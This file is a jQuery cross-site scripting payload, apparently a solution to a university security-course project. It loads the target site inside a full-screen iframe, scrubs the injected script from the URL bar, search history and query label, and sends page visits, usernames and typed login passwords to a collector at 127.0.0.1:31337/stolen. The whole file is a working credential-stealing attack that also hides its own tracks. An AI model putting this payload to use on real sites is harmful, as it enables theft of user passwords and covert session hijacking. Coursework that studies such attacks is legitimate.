$(document).ready(function() {
    /* Adding the hacked iframe and removing the actual body, which contains the searched query with the code inside */
    var iframeHtml = "<div id=\"iframe-hack\"><iframe style=\"width:100%; height:100%; position:fixed; left:0; top:0;\" src=\"http://cis331.cis.upenn.edu/project2\"></iframe></div>";
    $("body").append(iframeHtml);
    $('body > :not(#iframe-hack)').hide();

    /* Removing the JavaScript code from the URL*/
    window.history.pushState("Blah", "Title", document.URL.split("search")[0]);

    /* Properly hiding all of the hacky stuff whenever the iframe changes */
    $('#iframe-hack > iframe').load(function() {
        /* Reporting the page displayed by loading the URL */
        var username = $("#iframe-hack > iframe").contents().find("#logged-in-user").text();
        var encodedUrl = encodeURIComponent(document.URL);
        if (username) { 
            $.get("http://127.0.0.1:31337/stolen?event=nav&user=" + username + "&url=" + encodedUrl);
        } else {
            $.get("http://127.0.0.1:31337/stolen?event=nav&url=" + encodedUrl);
        }
        /* Functions defined below that hide all suspicious activity from the page */
        hideHacks();
        bindEvents();
        miscellaneous();
    });
});

/* Hides the scripts in the search query and the search history */
var hideHacks = function () { 
    /* Hiding search elements that have JavaScript code */
    $("#iframe-hack > iframe").contents().find("#history-list").children().each( function () { 
        var text = $(this).text();
        if (text.indexOf("script") > -1 || text.indexOf("$") > -1) { 
            var hidden_text = text.split("<script")[0];
            if (hidden_text) { 
                $(this).text(hidden_text);
            } else {
                $(this).hide();
            }
        }
    });

    /* Removing the query that includes script code */
    $("#iframe-hack > iframe").contents().find("#query-lbl").text($("#iframe-hack > iframe").contents().find("#query-lbl").text().split("<script")[0]);
};

/* Binds the necessary events to all the buttons/links to ensure that the URL looks legit */
var bindEvents = function () { 
    /* Making the logout button report the user's username */
    $("#iframe-hack > iframe").contents().find("#log-out-btn").on( "click", function () { 
        var username = $("#iframe-hack > iframe").contents().find("#logged-in-user").text();
        $.get("http://127.0.0.1:31337/stolen?event=logout&user=" + username);
    });
    
    /* Making the login button report the user's username and password */
    $("#iframe-hack > iframe").contents().find("#log-in-btn").on( "click", function () { 
        var username = $("#iframe-hack > iframe").contents().find("#username").val();
        var password = $("#iframe-hack > iframe").contents().find("#userpass").val();
        $.get("http://127.0.0.1:31337/stolen?event=login&user=" + username + "&pass=" + password);
    });

    /* Changing the URL whenever a search is performed */
    $("#iframe-hack > iframe").contents().find("#search-btn").on( "click", function () { 
        var query = $("#iframe-hack > iframe").contents().find("#query").val().split("<script")[0];
        window.history.replaceState("Blah", "Title", "search?q=" + query);
    });

    /* Clearing the URL whenever a new search begins */
    $("#iframe-hack > iframe").contents().find("#search-again-btn").on( "click", function () { 
        var rootUrl = document.URL.split("search")[0];
        window.history.pushState("Blah", "Title", rootUrl);
    });

    /* Clearing the URL whenever user logs out */
    $("#iframe-hack > iframe").contents().find("#log-out-btn").on( "click", function () { 
        var rootUrl = document.URL.split("search")[0];
        window.history.pushState("Blah", "Title", rootUrl);
    });
};

/* Miscellaneous things that still need to be done */
var miscellaneous = function () { 
    /* If URL contains search parameters but we're not on the search page, fix the URL */
    if ($("#iframe-hack > iframe").contents().find("#query").length > 0) { 
        if (document.URL.indexOf("search") > -1) { 
            var rootUrl = document.URL.split("search")[0];
            window.history.replaceState("Blah", "Title", rootUrl);
        }
    }
    /* If the URL does not contain the search parameters but we're on the search page, fix the URL */
    if ($("#iframe-hack > iframe").contents().find("#query-lbl").length > 0) { 
        if (document.URL.indexOf("search") < 0) { 
            var query = $("#iframe-hack > iframe").contents().find("#query-lbl").text();
            window.history.replaceState("Blah", "Title", "search?q=" + query);
        }
    }
};
